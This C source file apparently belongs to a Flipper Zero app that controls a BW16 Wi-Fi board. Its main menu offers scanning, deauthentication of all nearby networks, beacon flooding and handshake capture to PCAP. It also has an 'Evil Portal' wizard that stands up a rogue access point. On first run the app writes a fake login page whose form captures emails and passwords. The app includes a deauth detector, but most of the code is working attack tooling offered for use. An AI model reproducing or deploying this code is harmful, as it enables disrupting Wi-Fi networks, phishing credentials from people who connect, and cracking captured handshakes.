#include "wifi_study_app.h"
#include "uart_handler.h"
#include "views/splash_view.h"
#include "views/scanner_view.h"
#include "views/channel_map_view.h"
#include "views/protocol_view.h"
#include "views/capture_view.h"
#include "views/portal_view.h"
#include "views/pwn_view.h"
#include "views/deauthall_view.h"
#include "views/terminal_view.h"
#include "views/comingsoon_view.h"
#include "views/probe_view.h"
#include "views/cam_view.h"
#include "views/egg_view.h"
#include "views/ddet_view.h"
#include "views/station_view.h"
#include <stdlib.h>
#include <string.h>
#include <storage/storage.h>
#include <stdio.h>

/* ── Custom events ──────────────────────────────────────────── */
#define EVT_SPLASH 0
#define EVT_REDRAW 1

/* ── Menu callback ──────────────────────────────────────────── */
static void menu_cb(void* ctx, uint32_t idx) {
    WifiStudyApp* app = ctx;
    static const AppView map[] = {
        ViewScanner, ViewChanMap, ViewProtocol, ViewCapture,
        ViewComingSoon, ViewAttack, ViewDeauthAll, ViewPwn,
        ViewProbe, ViewCam, ViewStation, ViewDeauthDet, ViewTerminal
    };
    if(idx < 13)
        view_dispatcher_switch_to_view(app->view_dispatcher, map[idx]);
}

/* ── Evil Portal wizard ─────────────────────────────────────── */

/* Stream a custom HTML file to the BW16 as base64 chunks */
static void stream_html(WifiStudyApp* app, const char* path) {
    static const char* B64 =
      "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    Storage* storage = furi_record_open(RECORD_STORAGE);
    File* f = storage_file_alloc(storage);
    if(storage_file_open(f, path, FSAM_READ, FSOM_OPEN_EXISTING)) {
        uart_send_cmd(app, "CMD,HTMLBEG");
        uint8_t in[96]; char line[140];
        size_t rd;
        while((rd = storage_file_read(f, in, sizeof(in))) > 0) {
            int p = 0;
            line[p++]='C';line[p++]='M';line[p++]='D';line[p++]=',';
            line[p++]='H';line[p++]='T';line[p++]='M';line[p++]='L';
            line[p++]='D';line[p++]=',';
            for(size_t i=0;i<rd;i+=3){
                uint32_t n = (uint32_t)in[i] << 16;
                if(i+1<rd) n |= (uint32_t)in[i+1] << 8;
                if(i+2<rd) n |= in[i+2];
                line[p++]=B64[(n>>18)&63];
                line[p++]=B64[(n>>12)&63];
                line[p++]=(i+1<rd)?B64[(n>>6)&63]:'=';
                line[p++]=(i+2<rd)?B64[n&63]:'=';
            }
            line[p]='\0';
            uart_send_cmd(app, line);
            furi_delay_ms(8);  /* let the BW16 keep up */
        }
        uart_send_cmd(app, "CMD,HTMLEND");
    }
    storage_file_close(f);
    storage_file_free(f);
    furi_record_close(RECORD_STORAGE);
}

static void portal_launch(WifiStudyApp* app) {
    if(app->portal.use_custom && app->portal.html_path[0])
        stream_html(app, app->portal.html_path);

    char ssid[SSID_LEN], pass[33];
    furi_mutex_acquire(app->data_mutex, FuriWaitForever);
    strncpy(ssid, app->portal.ssid, SSID_LEN-1); ssid[SSID_LEN-1]='\0';
    strncpy(pass, app->portal.password, 32);     pass[32]='\0';
    app->portal.channel = 6;
    app->portal.active  = true;
    app->portal.clients = 0;
    app->portal.got_creds = false;
    furi_mutex_release(app->data_mutex);

    char cmd[120];
    snprintf(cmd, sizeof(cmd), "CMD,AP,%s,6,%s", ssid, pass);
    uart_send_cmd(app, cmd);
    view_dispatcher_switch_to_view(app->view_dispatcher, ViewPortal);
}

#define ASSETS_DIR "/ext/apps_assets/wifi_study"
#define SD_DIR     "/ext/EPORTAL_BW16"

static void p_html_cb(void* ctx, uint32_t idx);

static void add_entry(WifiStudyApp* app, const char* label,
                      const char* path, uint8_t kind) {
    if(app->p_count >= 48) return;
    strncpy(app->p_label[app->p_count], label, 39);
    app->p_label[app->p_count][39]='\0';
    if(path) { strncpy(app->p_path[app->p_count], path, 159);
               app->p_path[app->p_count][159]='\0'; }
    else app->p_path[app->p_count][0]='\0';
    app->p_kind[app->p_count] = kind;
    submenu_add_item(app->p_html_menu, app->p_label[app->p_count],
                     (uint32_t)app->p_count, p_html_cb, app);
    app->p_count++;
}

/* list *.html files in a directory as selectable entries */
static void list_html_dir(WifiStudyApp* app, Storage* st, const char* dirpath) {
    File* dir = storage_file_alloc(st);
    if(storage_dir_open(dir, dirpath)) {
        FileInfo fi; char name[128];
        while(storage_dir_read(dir, &fi, name, sizeof(name))) {
            if(fi.flags & FSF_DIRECTORY) continue;
            size_t l = strlen(name);
            if(l<5 || strncmp(name+l-5,".html",5)!=0) continue;
            char label[40]; strncpy(label, name, 39); label[39]='\0';
            char* dot = strstr(label, ".html"); if(dot) *dot='\0';
            char full[160]; snprintf(full, sizeof(full), "%s/%s", dirpath, name);
            add_entry(app, label, full, 2);
        }
        storage_dir_close(dir);
    }
    storage_file_free(dir);
}

/* (re)build the portal-page menu: top level = categories, drill in = files */
static void build_html_menu(WifiStudyApp* app) {
    submenu_reset(app->p_html_menu);
    app->p_count = 0;
    Storage* st = furi_record_open(RECORD_STORAGE);
    storage_common_mkdir(st, SD_DIR);

    if(app->p_category[0] == '\0') {
        submenu_set_header(app->p_html_menu, "Portal page");
        add_entry(app, "Built-in Login", NULL, 0);
        /* bundled category folders */
        File* dir = storage_file_alloc(st);
        if(storage_dir_open(dir, ASSETS_DIR)) {
            FileInfo fi; char name[128];
            while(storage_dir_read(dir, &fi, name, sizeof(name))) {
                if(!(fi.flags & FSF_DIRECTORY)) continue;
                if(name[0]=='.') continue;
                add_entry(app, name, name, 1);
            }
            storage_dir_close(dir);
        }
        storage_file_free(dir);
        add_entry(app, "My SD Files", "__SD__", 1);
    } else {
        char hdr[32]; snprintf(hdr, sizeof(hdr), "%s pages", app->p_category);
        submenu_set_header(app->p_html_menu, hdr);
        add_entry(app, "< Back", NULL, 3);
        if(strcmp(app->p_category, "__SD__")==0) {
            list_html_dir(app, st, SD_DIR);
        } else {
            char d[160]; snprintf(d, sizeof(d), "%s/%s", ASSETS_DIR, app->p_category);
            list_html_dir(app, st, d);
        }
    }
    furi_record_close(RECORD_STORAGE);
    submenu_set_selected_item(app->p_html_menu, 0);
}

/* step 1: SSID entered -> build HTML list, go to HTML step */
static void p_ssid_done(void* ctx) {
    WifiStudyApp* app = ctx;
    if(app->portal.ssid[0]=='\0')
        strncpy(app->portal.ssid, "Free WiFi", SSID_LEN-1);
    app->p_category[0] = '\0';   /* start at top level */
    build_html_menu(app);
    view_dispatcher_switch_to_view(app->view_dispatcher, ViewPHtml);
}

/* HTML entry chosen */
static void p_html_cb(void* ctx, uint32_t idx) {
    WifiStudyApp* app = ctx;
    if((int)idx >= app->p_count) return;
    uint8_t kind = app->p_kind[idx];

    if(kind == 0) {                       /* Built-in */
        app->portal.use_custom = false;
        app->portal.html_path[0] = '\0';
        view_dispatcher_switch_to_view(app->view_dispatcher, ViewPSec);
    } else if(kind == 1) {                /* enter a category */
        strncpy(app->p_category, app->p_path[idx], sizeof(app->p_category)-1);
        app->p_category[sizeof(app->p_category)-1]='\0';
        build_html_menu(app);
    } else if(kind == 2) {                /* a portal file */
        app->portal.use_custom = true;
        strncpy(app->portal.html_path, app->p_path[idx],
                sizeof(app->portal.html_path)-1);
        app->portal.html_path[sizeof(app->portal.html_path)-1]='\0';
        view_dispatcher_switch_to_view(app->view_dispatcher, ViewPSec);
    } else {                              /* < Back to top level */
        app->p_category[0] = '\0';
        build_html_menu(app);
    }
}

/* security chosen */
static void p_sec_cb(void* ctx, uint32_t idx) {
    WifiStudyApp* app = ctx;
    if(idx == 0) {                 /* Open */
        app->portal.password[0] = '\0';
        portal_launch(app);
    } else {                       /* WPA2 -> ask password */
        app->portal.password[0] = '\0';
        view_dispatcher_switch_to_view(app->view_dispatcher, ViewPPass);
    }
}

static void p_pass_done(void* ctx) {
    WifiStudyApp* app = ctx;
    portal_launch(app);
}

/* Attack submenu: beacon flood + soft AP */
static void attack_cb(void* ctx, uint32_t idx) {
    WifiStudyApp* app = ctx;
    switch(idx) {
    case 0: uart_send_cmd(app, "CMD,BEACON,RICK"); break;
    case 1: uart_send_cmd(app, "CMD,BEACON,RAND"); break;
    case 2:  /* stand up a soft AP + captive portal */
        furi_mutex_acquire(app->data_mutex, FuriWaitForever);
        memset(&app->portal, 0, sizeof(PortalState));
        strncpy(app->portal.ssid, "Free WiFi", SSID_LEN-1);
        app->portal.channel = 6;
        app->portal.active  = true;
        furi_mutex_release(app->data_mutex);
        uart_send_cmd(app, "CMD,AP,Free WiFi,6");
        view_dispatcher_switch_to_view(app->view_dispatcher, ViewPortal);
        break;
    case 3: uart_send_cmd(app, "CMD,DALL"); break;       /* deauth everything */
    case 4: uart_send_cmd(app, "CMD,STOP");              /* stop all attacks */
            uart_send_cmd(app, "CMD,BEACON,STOP"); break;
    }
}

static uint32_t back_to_main(void* ctx) { UNUSED(ctx); return ViewMain; }
static uint32_t back_exit(void*   ctx) { UNUSED(ctx); return VIEW_NONE; }

/* ── Force a redraw of the active view ──────────────────────── *
 * Custom events alone don't repaint a view; committing its model
 * (with update=true) triggers view_port_update for the view that
 * is currently displayed. Doing it for all views is harmless.    */
static void force_redraw(WifiStudyApp* app) {
    View* vs[] = {
        app->scanner_view, app->chanmap_view,
        app->protocol_view, app->capture_view, app->portal_view,
        app->pwn_view, app->deauthall_view, app->terminal_view,
        app->probe_view, app->cam_view, app->egg_view,
        app->ddet_view, app->station_view
    };
    for(size_t i = 0; i < 13; i++) {
        if(!vs[i]) continue;
        view_get_model(vs[i]);           /* lock   */
        view_commit_model(vs[i], true);  /* unlock + repaint if active */
    }
}

/* ── Custom event callback ──────────────────────────────────── */
static bool custom_event_cb(void* ctx, uint32_t ev) {
    WifiStudyApp* app = (WifiStudyApp*)ctx;
    if(ev == EVT_SPLASH) {
        view_dispatcher_switch_to_view(app->view_dispatcher, ViewMain);
        return true;
    }
    if(ev == EVT_REDRAW) {
        force_redraw(app);
        return true;
    }
    return false;
}

/* ── Timer (200 ms) ─────────────────────────────────────────── */
static void timer_cb(void* ctx) {
    WifiStudyApp* app = ctx;

    if(!app->splash_done) {
        app->splash_pct += 3;   /* slower: leaves time for the secret combo */
        if(app->splash_pct >= 100) {
            app->splash_pct  = 100;
            app->splash_done = true;
            view_dispatcher_send_custom_event(app->view_dispatcher, EVT_SPLASH);
        } else {
            /* repaint splash progress */
            view_get_model(app->splash_view);
            view_commit_model(app->splash_view, true);
        }
        return;
    }

    if(app->bw16_ok &&
       furi_get_tick() - app->bw16_last_seen > furi_ms_to_ticks(10000))
        app->bw16_ok = false;

    /* haptic/sound/LED feedback for catches */
    if(app->notify_hs)    { app->notify_hs = false;
        notification_message(app->notifications, &sequence_success); }
    if(app->notify_creds) { app->notify_creds = false;
        notification_message(app->notifications, &sequence_success); }
    if(app->notify_cam)   { app->notify_cam = false;
        notification_message(app->notifications, &sequence_single_vibro);
        notification_message(app->notifications, &sequence_blink_blue_100); }

    /* keep handshakes: write any pending pwn capture to the SD as PCAP */
    if(app->pwn_save_pending) {
        furi_mutex_acquire(app->data_mutex, FuriWaitForever);
        strncpy(app->capture.target_bssid, app->pwn_save_bssid, MAC_LEN-1);
        strncpy(app->capture.target_ssid, "pwn", SSID_LEN-1);
        app->pwn_save_pending = false;
        furi_mutex_release(app->data_mutex);
        save_handshake_to_sd(app);   /* writes /ext/wifi_study/pwn_<bssid>.pcap */
        furi_mutex_acquire(app->data_mutex, FuriWaitForever);
        app->capture.nframes = 0;    /* fresh buffer for the next catch */
        furi_mutex_release(app->data_mutex);
    }

    view_dispatcher_send_custom_event(app->view_dispatcher, EVT_REDRAW);
}

/* ── Save captured handshake to Flipper SD ──────────────────── */
void save_handshake_to_sd(WifiStudyApp* app) {
    Storage* storage = furi_record_open(RECORD_STORAGE);
    storage_common_mkdir(storage, "/ext/wifi_study");

    /* snapshot the captured frames under the lock */
    char bssid[MAC_LEN], ssid[SSID_LEN];
    static uint8_t frames[CAP_MAX_FRAMES][CAP_FRAME_MAX];
    uint16_t flen[CAP_MAX_FRAMES];
    int nframes;
    furi_mutex_acquire(app->data_mutex, FuriWaitForever);
    strncpy(bssid, app->capture.target_bssid, MAC_LEN-1); bssid[MAC_LEN-1]='\0';
    strncpy(ssid,  app->capture.target_ssid,  SSID_LEN-1); ssid[SSID_LEN-1]='\0';
    nframes = app->capture.nframes;
    if(nframes > CAP_MAX_FRAMES) nframes = CAP_MAX_FRAMES;
    for(int i=0;i<nframes;i++){
        flen[i] = app->capture.flen[i];
        if(flen[i] > CAP_FRAME_MAX) flen[i] = CAP_FRAME_MAX;
        memcpy(frames[i], app->capture.frames[i], flen[i]);
    }
    app->capture.saved = true;
    furi_mutex_release(app->data_mutex);

    char path[96];
    snprintf(path, sizeof(path), "/ext/wifi_study/%s_%s.pcap", ssid, bssid);
    for(char* p = path; *p; p++) if(*p==':'||*p==' ') *p='-';

    File* file = storage_file_alloc(storage);
    if(storage_file_open(file, path, FSAM_WRITE, FSOM_CREATE_ALWAYS)) {
        /* PCAP global header, little-endian, linktype 105 = IEEE802.11 */
        uint8_t gh[24] = {
            0xd4,0xc3,0xb2,0xa1, 0x02,0x00,0x04,0x00,
            0x00,0x00,0x00,0x00, 0x00,0x00,0x00,0x00,
            0xff,0xff,0x00,0x00, 0x69,0x00,0x00,0x00 };
        storage_file_write(file, gh, sizeof(gh));
        uint32_t ts = furi_get_tick();
        for(int i=0;i<nframes;i++){
            uint32_t l = flen[i];
            uint8_t rh[16];
            rh[0]=ts&0xFF; rh[1]=(ts>>8)&0xFF; rh[2]=(ts>>16)&0xFF; rh[3]=(ts>>24)&0xFF;
            rh[4]=(uint8_t)i; rh[5]=0; rh[6]=0; rh[7]=0;           /* usec */
            rh[8]=l&0xFF; rh[9]=(l>>8)&0xFF; rh[10]=0; rh[11]=0;   /* incl_len */
            rh[12]=l&0xFF; rh[13]=(l>>8)&0xFF; rh[14]=0; rh[15]=0; /* orig_len */
            storage_file_write(file, rh, 16);
            storage_file_write(file, frames[i], l);
        }
        storage_file_close(file);
    }
    storage_file_free(file);
    furi_record_close(RECORD_STORAGE);
}

/* ── Alloc ──────────────────────────────────────────────────── */
static WifiStudyApp* app_alloc() {
    WifiStudyApp* app = malloc(sizeof(WifiStudyApp));
    furi_check(app);
    memset(app, 0, sizeof(WifiStudyApp));

    app->data_mutex    = furi_mutex_alloc(FuriMutexTypeNormal);
    app->gui           = furi_record_open(RECORD_GUI);
    app->notifications = furi_record_open(RECORD_NOTIFICATION);

    app->view_dispatcher = view_dispatcher_alloc();
    view_dispatcher_attach_to_gui(app->view_dispatcher, app->gui,
                                  ViewDispatcherTypeFullscreen);
    view_dispatcher_set_event_callback_context(app->view_dispatcher, app);
    view_dispatcher_set_custom_event_callback(app->view_dispatcher,
                                              custom_event_cb);

    app->splash_view = splash_view_alloc(app);
    view_set_previous_callback(app->splash_view, back_exit);
    view_dispatcher_add_view(app->view_dispatcher, ViewSplash, app->splash_view);

    app->main_menu = submenu_alloc();
    submenu_add_item(app->main_menu, "Scan + Deauth",     0, menu_cb, app);
    submenu_add_item(app->main_menu, "Channel Map",       1, menu_cb, app);
    submenu_add_item(app->main_menu, "Protocol Monitor",  2, menu_cb, app);
    submenu_add_item(app->main_menu, "Capture Handshake", 3, menu_cb, app);
    submenu_add_item(app->main_menu, "Evil Portal",       4, menu_cb, app);
    submenu_add_item(app->main_menu, "Create AP / Beacon",5, menu_cb, app);
    submenu_add_item(app->main_menu, "Deauth All",        6, menu_cb, app);
    submenu_add_item(app->main_menu, "Pwnagotchi",        7, menu_cb, app);
    submenu_add_item(app->main_menu, "Probe Sniffer",     8, menu_cb, app);
    submenu_add_item(app->main_menu, "Camera Detector",   9, menu_cb, app);
    submenu_add_item(app->main_menu, "Station List",     10, menu_cb, app);
    submenu_add_item(app->main_menu, "Deauth Detector",  11, menu_cb, app);
    submenu_add_item(app->main_menu, "Live Log",         12, menu_cb, app);
    view_set_previous_callback(submenu_get_view(app->main_menu), back_exit);
    view_dispatcher_add_view(app->view_dispatcher, ViewMain,
                             submenu_get_view(app->main_menu));

    app->attack_menu = submenu_alloc();
    submenu_add_item(app->attack_menu, "Beacon: Rickroll",  0, attack_cb, app);
    submenu_add_item(app->attack_menu, "Beacon: Random",    1, attack_cb, app);
    submenu_add_item(app->attack_menu, "Soft AP + Portal",  2, attack_cb, app);
    submenu_add_item(app->attack_menu, "Deauth ALL nearby", 3, attack_cb, app);
    submenu_add_item(app->attack_menu, "Stop all attacks",  4, attack_cb, app);
    view_set_previous_callback(submenu_get_view(app->attack_menu), back_to_main);
    view_dispatcher_add_view(app->view_dispatcher, ViewAttack,
                             submenu_get_view(app->attack_menu));

    /* ── Evil Portal wizard: SSID → HTML → security → (password) ── */
    app->p_ssid_input = text_input_alloc();
    text_input_set_header_text(app->p_ssid_input, "Enter AP name");
    text_input_set_result_callback(app->p_ssid_input, p_ssid_done, app,
                                   app->portal.ssid, SSID_LEN, true);
    view_set_previous_callback(text_input_get_view(app->p_ssid_input), back_to_main);
    view_dispatcher_add_view(app->view_dispatcher, ViewPSsid,
                             text_input_get_view(app->p_ssid_input));

    app->p_html_menu = submenu_alloc();
    submenu_set_header(app->p_html_menu, "Portal page");
    view_set_previous_callback(submenu_get_view(app->p_html_menu), back_to_main);
    view_dispatcher_add_view(app->view_dispatcher, ViewPHtml,
                             submenu_get_view(app->p_html_menu));

    app->p_sec_menu = submenu_alloc();
    submenu_set_header(app->p_sec_menu, "AP security");
    submenu_add_item(app->p_sec_menu, "Open (no password)", 0, p_sec_cb, app);
    submenu_add_item(app->p_sec_menu, "WPA2 (set password)", 1, p_sec_cb, app);
    view_set_previous_callback(submenu_get_view(app->p_sec_menu), back_to_main);
    view_dispatcher_add_view(app->view_dispatcher, ViewPSec,
                             submenu_get_view(app->p_sec_menu));

    app->p_pass_input = text_input_alloc();
    text_input_set_header_text(app->p_pass_input, "AP password (8+)");
    text_input_set_result_callback(app->p_pass_input, p_pass_done, app,
                                   app->portal.password, 33, true);
    view_set_previous_callback(text_input_get_view(app->p_pass_input), back_to_main);
    view_dispatcher_add_view(app->view_dispatcher, ViewPPass,
                             text_input_get_view(app->p_pass_input));

    app->scanner_view  = scanner_view_alloc(app);
    app->chanmap_view  = channel_map_view_alloc(app);
    app->protocol_view = protocol_view_alloc(app);
    app->capture_view  = capture_view_alloc(app);
    app->portal_view   = portal_view_alloc(app);
    app->pwn_view      = pwn_view_alloc(app);
    app->deauthall_view = deauthall_view_alloc(app);
    app->terminal_view  = terminal_view_alloc(app);
    app->comingsoon_view = comingsoon_view_alloc(app);
    app->probe_view = probe_view_alloc(app);
    app->cam_view = cam_view_alloc(app);
    app->egg_view = egg_view_alloc(app);
    app->ddet_view = ddet_view_alloc(app);
    app->station_view = station_view_alloc(app);

    view_set_previous_callback(app->scanner_view,  back_to_main);
    view_set_previous_callback(app->chanmap_view,  back_to_main);
    view_set_previous_callback(app->protocol_view, back_to_main);
    view_set_previous_callback(app->capture_view,  back_to_main);
    view_set_previous_callback(app->portal_view,   back_to_main);
    view_set_previous_callback(app->pwn_view,      back_to_main);
    view_set_previous_callback(app->deauthall_view, back_to_main);
    view_set_previous_callback(app->terminal_view, back_to_main);
    view_set_previous_callback(app->comingsoon_view, back_to_main);
    view_set_previous_callback(app->probe_view, back_to_main);
    view_set_previous_callback(app->cam_view, back_to_main);
    view_set_previous_callback(app->egg_view, back_to_main);
    view_set_previous_callback(app->ddet_view, back_to_main);
    view_set_previous_callback(app->station_view, back_to_main);

    view_dispatcher_add_view(app->view_dispatcher, ViewScanner,  app->scanner_view);
    view_dispatcher_add_view(app->view_dispatcher, ViewChanMap,  app->chanmap_view);
    view_dispatcher_add_view(app->view_dispatcher, ViewProtocol, app->protocol_view);
    view_dispatcher_add_view(app->view_dispatcher, ViewCapture,  app->capture_view);
    view_dispatcher_add_view(app->view_dispatcher, ViewPortal,   app->portal_view);
    view_dispatcher_add_view(app->view_dispatcher, ViewPwn,      app->pwn_view);
    view_dispatcher_add_view(app->view_dispatcher, ViewDeauthAll, app->deauthall_view);
    view_dispatcher_add_view(app->view_dispatcher, ViewTerminal, app->terminal_view);
    view_dispatcher_add_view(app->view_dispatcher, ViewComingSoon, app->comingsoon_view);
    view_dispatcher_add_view(app->view_dispatcher, ViewProbe, app->probe_view);
    view_dispatcher_add_view(app->view_dispatcher, ViewCam, app->cam_view);
    view_dispatcher_add_view(app->view_dispatcher, ViewEgg, app->egg_view);
    view_dispatcher_add_view(app->view_dispatcher, ViewDeauthDet, app->ddet_view);
    view_dispatcher_add_view(app->view_dispatcher, ViewStation, app->station_view);

    return app;
}

static void app_free(WifiStudyApp* app) {
    static const AppView all[] = {
        ViewSplash, ViewMain, ViewScanner, ViewChanMap,
        ViewProtocol, ViewCapture, ViewPortal, ViewAttack,
        ViewPSsid, ViewPHtml, ViewPSec, ViewPPass, ViewPwn, ViewDeauthAll,
        ViewTerminal, ViewComingSoon, ViewProbe, ViewCam, ViewEgg,
        ViewDeauthDet, ViewStation
    };
    for(size_t i=0; i<21; i++)
        view_dispatcher_remove_view(app->view_dispatcher, all[i]);

    splash_view_free(app->splash_view);
    submenu_free(app->main_menu);
    submenu_free(app->attack_menu);
    text_input_free(app->p_ssid_input);
    submenu_free(app->p_html_menu);
    submenu_free(app->p_sec_menu);
    text_input_free(app->p_pass_input);
    scanner_view_free(app->scanner_view);
    channel_map_view_free(app->chanmap_view);
    protocol_view_free(app->protocol_view);
    capture_view_free(app->capture_view);
    portal_view_free(app->portal_view);
    pwn_view_free(app->pwn_view);
    deauthall_view_free(app->deauthall_view);
    terminal_view_free(app->terminal_view);
    comingsoon_view_free(app->comingsoon_view);
    probe_view_free(app->probe_view);
    cam_view_free(app->cam_view);
    egg_view_free(app->egg_view);
    ddet_view_free(app->ddet_view);
    station_view_free(app->station_view);

    view_dispatcher_free(app->view_dispatcher);
    furi_record_close(RECORD_GUI);
    furi_record_close(RECORD_NOTIFICATION);
    furi_mutex_free(app->data_mutex);
    free(app);
}

/* Create /ext/EPORTAL_BW16 on first run with a ready-to-edit example
 * page (its form posts to /l so credential capture works). */
static void ensure_eportal_folder(void) {
    Storage* st = furi_record_open(RECORD_STORAGE);
    storage_common_mkdir(st, "/ext/EPORTAL_BW16");
    if(!storage_file_exists(st, "/ext/EPORTAL_BW16/example.html")) {
        File* f = storage_file_alloc(st);
        if(storage_file_open(f, "/ext/EPORTAL_BW16/example.html",
                             FSAM_WRITE, FSOM_CREATE_ALWAYS)) {
            const char* h =
              "<!DOCTYPE html><html><head><meta name=viewport "
              "content='width=device-width,initial-scale=1'><title>Login</title>"
              "<style>body{font-family:sans-serif;background:#111;color:#eee;"
              "text-align:center;padding-top:40px}input{display:block;margin:8px "
              "auto;padding:10px;width:80%}button{padding:10px 20px}</style></head>"
              "<body><h2>WiFi Login</h2><form method=GET action=/l>"
              "<input name=u placeholder=Email><input name=p type=password "
              "placeholder=Password><button>Sign In</button></form>"
              "<p>Edit this file in /ext/EPORTAL_BW16/</p></body></html>";
            storage_file_write(f, h, strlen(h));
            storage_file_close(f);
        }
        storage_file_free(f);
    }
    furi_record_close(RECORD_STORAGE);
}

/* ── Entry point ────────────────────────────────────────────── */
int32_t wifi_study_app(void* p) {
    UNUSED(p);
    ensure_eportal_folder();
    WifiStudyApp* app = app_alloc();

    uart_handler_start(app);

    FuriTimer* timer = furi_timer_alloc(timer_cb, FuriTimerTypePeriodic, app);
    furi_timer_start(timer, 200);

    view_dispatcher_switch_to_view(app->view_dispatcher, ViewSplash);
    view_dispatcher_run(app->view_dispatcher);

    furi_timer_stop(timer);
    furi_timer_free(timer);

    /* Tell BW16 to drop any portal/capture mode on exit */
    uart_send_cmd(app, "CMD,STOP");

    uart_handler_stop(app);
    app_free(app);
    return 0;
}
